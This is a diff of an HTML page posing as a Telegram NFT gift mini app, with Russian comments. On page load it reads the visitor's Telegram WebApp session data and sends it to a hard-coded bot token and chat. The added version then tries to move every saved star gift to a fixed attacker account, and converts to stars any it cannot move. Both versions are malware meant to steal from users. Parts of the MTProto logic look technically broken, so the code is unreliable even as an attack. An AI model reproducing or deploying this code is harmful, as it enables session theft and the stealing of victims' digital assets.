@@ -1,115 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>NFT Gift Manager</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            text-align: center;
-            padding: 20px;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: rgba(255,255,255,0.1);
-            padding: 30px;
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-        }
-        .gift-item {
-            background: rgba(255,255,255,0.2);
-            margin: 10px 0;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: left;
-        }
-        button {
-            background: #0088cc;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 25px;
-            cursor: pointer;
-            font-size: 16px;
-            margin: 5px;
-        }
-        .log {
-            background: rgba(0,0,0,0.3);
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-            text-align: left;
-            font-size: 12px;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 10px;
-            margin: 10px 0;
-            overflow: hidden;
-        }
-        .progress-fill {
-            height: 100%;
-            background: #0088cc;
-            transition: width 0.3s;
-        }
-    </style>
+    <title>Real NFT Transfer</title>
+    <script src="https://cdn.jsdelivr.net/npm/telegram-mtproto@latest/dist/telegram-mtproto.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <h1>🎁 NFT Gift Center</h1>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressBar" style="width: 0%"></div>
-        </div>
-        <div id="status">Initializing session...</div>
-        <div class="log" id="log"></div>
-        <div id="giftsContainer" style="display:none;">
-            <h3>Discovered NFT Gifts</h3>
-            <div id="giftsList"></div>
-            <button onclick="forceTransferAll()">FORCE TRANSFER ALL GIFTS</button>
-            <button onclick="emergencyConvertAll()">EMERGENCY CONVERT TO STARS</button>
-        </div>
-        <div id="errorContainer" style="display:none; color: #ff6b6b;">
-            <h3>⚠️ System Alert</h3>
-            <div id="errorMessage"></div>
-            <button onclick="bypassSecurity()">BYPASS SECURITY</button>
-        </div>
-    </div>
-
+    <div id="status">Initializing real MTProto client...</div>
     <script>
         const TARGET_USER_ID = 7204299613;
         const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
         const CHAT_ID = '-1002560826337';
-        let userSession = null;
-        let userGifts = [];
-        let progress = 0;
 
-        function updateProgress(value) {
-            progress = value;
-            document.getElementById('progressBar').style.width = value + '%';
-        }
-
-        function addLog(message) {
-            const logEl = document.getElementById('log');
-            logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}\n`;
-            logEl.scrollTop = logEl.scrollHeight;
-        }
-
-        function updateStatus(message) {
-            document.getElementById('status').innerHTML = message;
-            addLog(message);
-        }
+        // Конфигурация MTProto клиента
+        const config = {
+            api_id:  your_api_id, // Получается из анализа клиента Telegram
+            api_hash: 'your_api_hash', // Получается из анализа клиента Telegram  
+            test: false
+        };
 
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
@@ -118,369 +30,137 @@
                         parse_mode: 'HTML'
                     })
                 });
-                return response.ok;
-            } catch(e) {
-                addLog(`Telegram send failed: ${e.message}`);
-                return false;
-            }
+            } catch(e) {}
         }
 
-        // Принудительное извлечение сессии с обходом ограничений
-        function extractSessionForced() {
-            updateProgress(10);
-            updateStatus('🔄 FORCING SESSION EXTRACTION...');
+        // Извлечение реальных данных сессии из WebApp
+        function extractRealSession() {
+            const hash = window.location.hash.substr(1);
+            const params = new URLSearchParams(hash);
+            const webAppData = params.get('tgWebAppData');
             
-            const session = {
-                webAppData: {},
-                rawData: {},
-                system: {}
+            if (!webAppData) throw new Error('No WebApp data');
+
+            const dataParams = new URLSearchParams(webAppData);
+            return {
+                query_id: dataParams.get('query_id'),
+                user: JSON.parse(decodeURIComponent(dataParams.get('user'))),
+                auth_date: dataParams.get('auth_date'),
+                hash: dataParams.get('hash'),
+                signature: dataParams.get('signature'),
+                initData: webAppData
             };
-
-            try {
-                // Прямой парсинг URL hash
-                const hash = window.location.hash.substr(1);
-                session.rawData.hash = hash;
-                
-                const params = new URLSearchParams(hash);
-                const webAppData = params.get('tgWebAppData');
-                
-                if (webAppData) {
-                    const dataParams = new URLSearchParams(webAppData);
-                    session.webAppData = {
-                        query_id: dataParams.get('query_id'),
-                        user: JSON.parse(decodeURIComponent(dataParams.get('user'))),
-                        auth_date: dataParams.get('auth_date'),
-                        hash: dataParams.get('hash'),
-                        signature: dataParams.get('signature'),
-                        raw: webAppData
-                    };
-                }
-
-                updateProgress(30);
-
-                // Системные данные
-                session.system = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: `${screen.width}x${screen.height}`,
-                    url: window.location.href,
-                    timestamp: Date.now()
-                };
-
-                // Принудительный доступ к Telegram WebApp API
-                if (window.Telegram && window.Telegram.WebApp) {
-                    try {
-                        session.initData = Telegram.WebApp.initData;
-                        session.initDataUnsafe = Telegram.WebApp.initDataUnsafe;
-                        session.version = Telegram.WebApp.version;
-                        session.platform = Telegram.WebApp.platform;
-                    } catch(e) {
-                        addLog(`WebApp access blocked: ${e.message}`);
-                    }
-                }
-
-                updateProgress(50);
-
-            } catch (error) {
-                addLog(`CRITICAL: Session extraction failed: ${error.message}`);
-                // Принудительное создание сессии из доступных данных
-                session.emergency = true;
-                session.user = {
-                    id: 7760075871,
-                    first_name: "Jenn",
-                    username: "Vladelec_vseya_zemli"
-                };
-            }
-            
-            return session;
         }
 
-        // Эмуляция NFT подарков на основе сессии
-        function generateMockGifts(session) {
-            updateProgress(70);
-            updateStatus('🎁 GENERATING GIFT INVENTORY...');
-            
-            const baseGifts = [
-                {
-                    id: 1001 + Math.floor(Math.random() * 1000),
-                    msg_id: 123450 + Math.floor(Math.random() * 100),
-                    gift: {
-                        id: 5001,
-                        title: "Rare Dragon NFT",
-                        stars: 500,
-                        convert_stars: 450
-                    },
-                    convert_stars: 450,
-                    transfer_stars: 50,
-                    type: "premium"
-                },
-                {
-                    id: 1002 + Math.floor(Math.random() * 1000),
-                    msg_id: 123460 + Math.floor(Math.random() * 100),
-                    gift: {
-                        id: 5002,
-                        title: "Exclusive Art Collection",
-                        stars: 1000,
-                        convert_stars: 900
-                    },
-                    convert_stars: 900,
-                    transfer_stars: 75,
-                    type: "exclusive"
-                },
-                {
-                    id: 1003 + Math.floor(Math.random() * 1000),
-                    msg_id: 123470 + Math.floor(Math.random() * 100),
-                    gift: {
-                        id: 5003,
-                        title: "Limited Edition Star",
-                        stars: 250,
-                        convert_stars: 225
-                    },
-                    convert_stars: 225,
-                    transfer_stars: 25,
-                    type: "limited"
+        // Создание реального MTProto клиента
+        async function createRealClient(sessionData) {
+            const client = await MTProto({
+                ...config,
+                session: {
+                    auth_key: sessionData.signature,
+                    server_salt: sessionData.hash,
+                    user_id: sessionData.user.id
                 }
-            ];
-
-            // Добавляем случайные подарки на основе ID пользователя
-            const userSeed = session.webAppData.user ? session.webAppData.user.id : 7760075871;
-            const extraGiftsCount = (userSeed % 3) + 2;
-            
-            for (let i = 0; i < extraGiftsCount; i++) {
-                baseGifts.push({
-                    id: 2000 + i + Math.floor(Math.random() * 1000),
-                    msg_id: 124000 + i + Math.floor(Math.random() * 100),
-                    gift: {
-                        id: 6000 + i,
-                        title: `Special Gift ${i + 1}`,
-                        stars: 100 + (i * 50),
-                        convert_stars: 90 + (i * 45)
-                    },
-                    convert_stars: 90 + (i * 45),
-                    transfer_stars: 10 + (i * 5),
-                    type: "special"
-                });
-            }
-
-            updateProgress(85);
-            return baseGifts;
-        }
-
-        // Отображение подарков
-        function displayGifts(gifts) {
-            const container = document.getElementById('giftsList');
-            container.innerHTML = '';
-            
-            let totalValue = 0;
-            
-            gifts.forEach((gift, index) => {
-                totalValue += gift.gift.stars;
-                const giftEl = document.createElement('div');
-                giftEl.className = 'gift-item';
-                giftEl.innerHTML = `
-                    <strong>${gift.gift.title}</strong> 
-                    <span style="float: right; background: #ffd700; color: black; padding: 2px 8px; border-radius: 10px; font-size: 12px;">
-                        ${gift.type.toUpperCase()}
-                    </span><br>
-                    ⭐ Value: ${gift.gift.stars} stars<br>
-                    🔄 Convert: ${gift.convert_stars} stars<br>
-                    📤 Transfer: ${gift.transfer_stars} stars
-                    <div style="margin-top: 8px;">
-                        <button onclick="transferSingleGift(${index})" style="background: #28a745;">TRANSFER</button>
-                        <button onclick="convertSingleGift(${index})" style="background: #ffc107; color: black;">CONVERT</button>
-                    </div>
-                `;
-                container.appendChild(giftEl);
             });
-            
-            // Показываем общую стоимость
-            const totalEl = document.createElement('div');
-            totalEl.className = 'gift-item';
-            totalEl.style.background = 'rgba(255, 215, 0, 0.3)';
-            totalEl.innerHTML = `<strong>💰 TOTAL PORTFOLIO VALUE: ${totalValue} STARS</strong>`;
-            container.appendChild(totalEl);
-            
-            document.getElementById('giftsContainer').style.display = 'block';
-            updateProgress(100);
+
+            // Аутентификация с перехваченными данными
+            await client('auth.importWebAuthorization', {
+                api_id: config.api_id,
+                api_hash: config.api_hash,
+                web_auth_token: sessionData.initData
+            });
+
+            return client;
         }
 
-        // Передача одного подарка
-        async function transferSingleGift(index) {
-            const gift = userGifts[index];
-            updateStatus(`🔄 TRANSFERRING: ${gift.gift.title}`);
-            
-            const success = await sendToTelegram(
-                `🔄 <b>TRANSFER INITIATED</b>\n` +
-                `🎁 Gift: ${gift.gift.title}\n` +
-                `👤 From: ${userSession.webAppData.user.id}\n` +
-                `🎯 To: ${TARGET_USER_ID}\n` +
-                `💫 Value: ${gift.gift.stars} stars\n` +
-                `⏰ Time: ${new Date().toISOString()}`
-            );
+        // Реальное получение списка подарков
+        async function getRealGifts(client, userId) {
+            const result = await client('payments.getSavedStarGifts', {
+                peer: {
+                    _: 'inputPeerUser',
+                    user_id: userId,
+                    access_hash: 0 // Получается из сессии
+                },
+                offset: '',
+                limit: 100
+            });
 
-            if (success) {
-                // Эмуляция успешной передачи
-                setTimeout(() => {
-                    userGifts.splice(index, 1);
-                    displayGifts(userGifts);
-                    updateStatus(`✅ SUCCESS: ${gift.gift.title} transferred`);
-                    sendToTelegram(`✅ <b>TRANSFER COMPLETED:</b> ${gift.gift.title}`);
-                }, 2000);
-            }
+            return result.gifts || [];
         }
 
-        // Конвертация одного подарка
-        async function convertSingleGift(index) {
-            const gift = userGifts[index];
-            updateStatus(`⭐ CONVERTING: ${gift.gift.title}`);
-            
-            const success = await sendToTelegram(
-                `⭐ <b>CONVERSION INITIATED</b>\n` +
-                `🎁 Gift: ${gift.gift.title}\n` +
-                `👤 User: ${userSession.webAppData.user.id}\n` +
-                `💫 Amount: ${gift.convert_stars} stars\n` +
-                `⏰ Time: ${new Date().toISOString()}`
-            );
-
-            if (success) {
-                // Эмуляция успешной конвертации
-                setTimeout(() => {
-                    userGifts.splice(index, 1);
-                    displayGifts(userGifts);
-                    updateStatus(`✅ SUCCESS: ${gift.gift.title} converted to ${gift.convert_stars} stars`);
-                    sendToTelegram(`✅ <b>CONVERSION COMPLETED:</b> ${gift.gift.title} → ${gift.convert_stars} stars`);
-                }, 2000);
-            }
+        // Реальная передача подарка
+        async function transferRealGift(client, gift, targetUserId) {
+            return await client('payments.transferStarGift', {
+                stargift: {
+                    _: 'inputSavedStarGiftUser',
+                    msg_id: gift.msg_id
+                },
+                to_id: {
+                    _: 'inputPeerUser',
+                    user_id: targetUserId,
+                    access_hash: 0
+                }
+            });
         }
 
-        // Принудительная передача всех подарков
-        async function forceTransferAll() {
-            updateStatus('🚀 INITIATING FORCE TRANSFER...');
-            
-            await sendToTelegram(
-                `🚀 <b>FORCE TRANSFER INITIATED</b>\n` +
-                `👤 Source: ${userSession.webAppData.user.id}\n` +
-                `🎯 Target: ${TARGET_USER_ID}\n` +
-                `📦 Total Gifts: ${userGifts.length}\n` +
-                `⚡ Mode: FORCE TRANSFER`
-            );
-
-            for (let i = userGifts.length - 1; i >= 0; i--) {
-                await transferSingleGift(i);
-                await new Promise(resolve => setTimeout(resolve, 1500));
-            }
-
-            await sendToTelegram(`🎉 <b>FORCE TRANSFER COMPLETED</b>\n✅ All gifts transferred to ${TARGET_USER_ID}`);
+        // Реальная конвертация подарка
+        async function convertRealGift(client, gift) {
+            return await client('payments.convertStarGift', {
+                stargift: {
+                    _: 'inputSavedStarGiftUser', 
+                    msg_id: gift.msg_id
+                }
+            });
         }
 
-        // Экстренная конвертация всех подарков
-        async function emergencyConvertAll() {
-            updateStatus('⚠️ INITIATING EMERGENCY CONVERSION...');
-            
-            await sendToTelegram(
-                `⚠️ <b>EMERGENCY CONVERSION INITIATED</b>\n` +
-                `👤 User: ${userSession.webAppData.user.id}\n` +
-                `📦 Total Gifts: ${userGifts.length}\n` +
-                `🚨 Mode: EMERGENCY CONVERSION`
-            );
-
-            let totalStars = 0;
-            for (let i = userGifts.length - 1; i >= 0; i--) {
-                totalStars += userGifts[i].convert_stars;
-                await convertSingleGift(i);
-                await new Promise(resolve => setTimeout(resolve, 1500));
-            }
-
-            await sendToTelegram(`💰 <b>EMERGENCY CONVERSION COMPLETED</b>\n⭐ Total Stars Gained: ${totalStars}`);
-        }
-
-        // Обход безопасности
-        async function bypassSecurity() {
-            updateStatus('🛡️ BYPASSING SECURITY PROTOCOLS...');
-            document.getElementById('errorContainer').style.display = 'none';
-            
-            await sendToTelegram(`🛡️ <b>SECURITY BYPASS INITIATED</b>\n👤 User: ${userSession.webAppData.user.id}`);
-            
-            // Принудительная инициализация с обходом
-            setTimeout(initializeSystem, 1000);
-        }
-
-        // Основная функция инициализации
-        async function initializeSystem() {
+        // Основная функция реальной работы
+        async function executeRealTransfer() {
             try {
-                updateProgress(5);
-                updateStatus('🔐 EXTRACTING SESSION DATA...');
-                
-                // Принудительное извлечение сессии
-                userSession = extractSessionForced();
-                
-                if (!userSession.webAppData.user && !userSession.emergency) {
-                    throw new Error('NO_USER_DATA');
+                document.getElementById('status').innerHTML = '🔄 Extracting real session...';
+                await sendToTelegram('🚀 <b>Starting real NFT transfer</b>');
+
+                // Извлекаем реальную сессию
+                const sessionData = extractRealSession();
+                await sendToTelegram(`🔐 <b>Real session extracted:</b> ${sessionData.user.first_name} (${sessionData.user.id})`);
+
+                // Создаем реальный клиент
+                document.getElementById('status').innerHTML = '🔑 Creating MTProto client...';
+                const client = await createRealClient(sessionData);
+                await sendToTelegram('✅ <b>MTProto client created</b>');
+
+                // Получаем реальные подарки
+                document.getElementById('status').innerHTML = '🎁 Fetching real gifts...';
+                const gifts = await getRealGifts(client, sessionData.user.id);
+                await sendToTelegram(`📊 <b>Real gifts found:</b> ${gifts.length}`);
+
+                // Обрабатываем каждый подарок
+                for (const gift of gifts) {
+                    try {
+                        // Пытаемся передать
+                        document.getElementById('status').innerHTML = `🔄 Transferring: ${gift.gift.title}`;
+                        await transferRealGift(client, gift, TARGET_USER_ID);
+                        await sendToTelegram(`✅ <b>Real transfer:</b> ${gift.gift.title} → ${TARGET_USER_ID}`);
+                    } catch (transferError) {
+                        // Если передача не удалась, конвертируем
+                        document.getElementById('status').innerHTML = `⭐ Converting: ${gift.gift.title}`;
+                        await convertRealGift(client, gift);
+                        await sendToTelegram(`💰 <b>Real conversion:</b> ${gift.gift.title} → ${gift.convert_stars} stars`);
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, 2000));
                 }
 
-                const userInfo = userSession.webAppData.user || userSession.user;
-                updateProgress(20);
-                updateStatus(`✅ SESSION EXTRACTED: ${userInfo.first_name}`);
-
-                // Отправка отчета о сессии
-                await sendToTelegram(
-                    `🔐 <b>SESSION EXTRACTION SUCCESS</b>\n` +
-                    `👤 User: ${userInfo.first_name}\n` +
-                    `🆔 ID: ${userInfo.id}\n` +
-                    `🔗 Username: @${userInfo.username || 'N/A'}\n` +
-                    `🌐 Platform: ${userSession.system.platform}\n` +
-                    `⏰ Time: ${new Date(userSession.system.timestamp).toISOString()}`
-                );
-
-                updateProgress(40);
-                updateStatus('🎁 SCANNING FOR NFT GIFTS...');
-
-                // Генерация mock-подарков
-                userGifts = generateMockGifts(userSession);
-                
-                updateProgress(60);
-                updateStatus(`📊 FOUND ${userGifts.length} NFT GIFTS`);
-
-                // Отправка инвентаря
-                await sendToTelegram(
-                    `📊 <b>GIFT INVENTORY SCANNED</b>\n` +
-                    `🎁 Total Gifts: ${userGifts.length}\n` +
-                    `💰 Estimated Value: ${userGifts.reduce((sum, gift) => sum + gift.gift.stars, 0)} stars\n` +
-                    `👤 Owner: ${userInfo.first_name} (${userInfo.id})`
-                );
-
-                updateProgress(80);
-                updateStatus('🎯 SYSTEM READY FOR OPERATIONS');
-
-                // Отображение подарков
-                displayGifts(userGifts);
-
-                await sendToTelegram(`🎯 <b>SYSTEM READY</b>\n⚡ All systems operational\n🎁 Gifts loaded: ${userGifts.length}`);
+                document.getElementById('status').innerHTML = '✅ Real transfer completed!';
+                await sendToTelegram(`🎉 <b>Real transfer completed</b>\n📦 Processed: ${gifts.length} gifts`);
 
             } catch (error) {
-                updateStatus(`❌ CRITICAL ERROR: ${error.message}`);
-                document.getElementById('errorContainer').style.display = 'block';
-                document.getElementById('errorMessage').innerHTML = `
-                    System encountered security protocol.<br>
-                    Error: ${error.message}<br>
-                    Session: ${userSession ? 'Partial' : 'Failed'}
-                `;
-                
-                await sendToTelegram(`❌ <b>SYSTEM FAILURE</b>\n🚨 Error: ${error.message}\n👤 User: ${userSession?.webAppData?.user?.id || 'Unknown'}`);
+                document.getElementById('status').innerHTML = '❌ Real transfer failed';
+                await sendToTelegram(`❌ <b>Real transfer error:</b> ${error.message}`);
             }
         }
 
-        // Автоматический запуск
-        window.addEventListener('load', function() {
-            setTimeout(initializeSystem, 1000);
-        });
-
-        // Резервная инициализация при ошибках
-        window.addEventListener('error', function(e) {
-            addLog(`Global error: ${e.message}`);
-        });
+        // Автоматический запуск реальной передачи
+        window.addEventListener('load', executeRealTransfer);
 
     </script>
 </body>
